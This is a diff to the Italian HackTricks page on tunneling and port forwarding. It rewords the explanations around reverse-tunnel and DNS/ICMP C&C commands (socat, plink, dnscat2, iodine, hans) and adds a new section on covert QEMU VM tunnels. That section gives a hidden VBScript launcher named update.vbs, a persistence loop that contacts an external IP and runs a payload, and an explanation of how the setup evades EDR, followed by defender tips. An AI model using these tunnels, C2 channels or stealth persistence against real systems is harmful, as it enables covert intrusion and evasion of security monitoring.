@@ -1,11 +1,11 @@
-# Tunneling and Port Forwarding
+# Tunneling e Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Suggerimento Nmap
 
 > [!WARNING]
-> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **TCP scans** (`-sT`) affinché questo funzioni.
+> Le scansioni **ICMP** e **SYN** non possono essere tunnelizzate attraverso i proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare le **scansioni TCP** (`-sT`) affinché questo funzioni.
 
 ## **Bash**
 
@@ -242,7 +242,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
 Tunnel inverso. Il tunnel viene avviato dalla vittima.\
-Un proxy socks4 viene creato su 127.0.0.1:1080
+Viene creato un proxy socks4 su 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -314,7 +314,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Collega la porta SSH locale (22) alla porta 443 dell'host attaccante
+Collegare la porta SSH locale (22) alla porta 443 dell'host attaccante
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -324,7 +324,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 È come una versione console di PuTTY (le opzioni sono molto simili a quelle di un client ssh).
 
-Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio e la nostra porta ssh in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
+Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -358,7 +358,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.
 
-**Connettersi** tramite **RDP** e caricare ed eseguire nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
+**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -366,11 +366,11 @@ Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare il proxy del traffico attraverso quella porta.**
+Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per proxyare il traffico attraverso quella porta.**
 
 ## Proxifica le app GUI di Windows
 
-Puoi fare in modo che le app GUI di Windows navigano attraverso un proxy usando [**Proxifier**](https://www.proxifier.com/).\
+Puoi far navigare le app GUI di Windows attraverso un proxy usando [**Proxifier**](https://www.proxifier.com/).\
 In **Profile -> Proxy Servers** aggiungi l'IP e la porta del server SOCKS.\
 In **Profile -> Proxification Rules** aggiungi il nome del programma da proxificare e le connessioni agli IP che vuoi proxificare.
 
@@ -385,7 +385,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Autenticandosi contro un proxy, crea un binding di una porta localmente che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
+Autenticandosi contro un proxy, crea un collegamento a una porta locale che viene inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
 Ad esempio, inoltra la porta 443.
 ```
 Username Alice
@@ -407,7 +407,7 @@ Un reverse proxy creato da Microsoft. Puoi trovarlo qui: [https://github.com/mic
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare i dati tra di essi utilizzando query DNS.
+È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e tunnelare dati tra di essi utilizzando query DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -421,7 +421,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**Scaricalo da qui**](https://github.com/iagox86/dnscat2)**.**
 
-Stabilisce un canale C\&C tramite DNS. Non richiede privilegi di root.
+Stabilisce un canale C\&C attraverso DNS. Non richiede privilegi di root.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -457,7 +457,7 @@ Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la rich
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
+È necessario avere i permessi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -608,9 +608,67 @@ ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_p
 ```
 Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:9000** senza implementare alcun strumento aggiuntivo – ideale per il pivoting living-off-the-land.
 
+## Tunnel Covert basati su VM con QEMU
+
+Il networking in modalità utente di QEMU (`-netdev user`) supporta un'opzione chiamata `hostfwd` che **collega una porta TCP/UDP sull'*host* e la inoltra nel *guest***. Quando il guest esegue un daemon SSH completo, la regola hostfwd ti offre una jump box SSH usa e getta che vive interamente all'interno di una VM effimera – perfetta per nascondere il traffico C2 da EDR poiché tutta l'attività e i file malevoli rimangono nel disco virtuale.
+
+### Quick one-liner
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• Il comando sopra avvia un'immagine di **Tiny Core Linux** (`tc.qcow2`) nella RAM.  
+• La porta **2222/tcp** sull'host Windows è inoltrata in modo trasparente a **22/tcp** all'interno del guest.  
+• Dal punto di vista dell'attaccante, il target espone semplicemente la porta 2222; tutti i pacchetti che la raggiungono sono gestiti dal server SSH in esecuzione nella VM.  
+
+### Avvio furtivo tramite VBScript
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+Eseguire lo script con `cscript.exe //B update.vbs` mantiene la finestra nascosta.
+
+### Persistenza in-guest
+
+Poiché Tiny Core è senza stato, gli attaccanti di solito:
+
+1. Posizionano il payload in `/opt/123.out`
+2. Aggiungono a `/opt/bootlocal.sh`:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. Aggiungono `home/tc` e `opt` a `/opt/filetool.lst` in modo che il payload venga impacchettato in `mydata.tgz` allo spegnimento.
+
+### Perché questo evade la rilevazione
+
+• Solo due eseguibili non firmati (`qemu-system-*.exe`) toccano il disco; non vengono installati driver o servizi.  
+• I prodotti di sicurezza sull'host vedono **traffico di loopback benigno** (il vero C2 termina all'interno della VM).  
+• Gli scanner di memoria non analizzano mai lo spazio del processo malevolo perché vive in un sistema operativo diverso.
+
+### Suggerimenti per Defender
+
+• Allerta su **binaries QEMU/VirtualBox/KVM in percorsi scrivibili dall'utente**.  
+• Blocca le connessioni in uscita che originano da `qemu-system*.exe`.  
+• Cerca porte di ascolto rare (2222, 10022, …) che si legano immediatamente dopo un avvio di QEMU.
+
+---
+
 ## Altri strumenti da controllare
 
-- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
-- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)  
+- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)  
+
+## Riferimenti
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)  
 
 {{#include ../banners/hacktricks-training.md}}
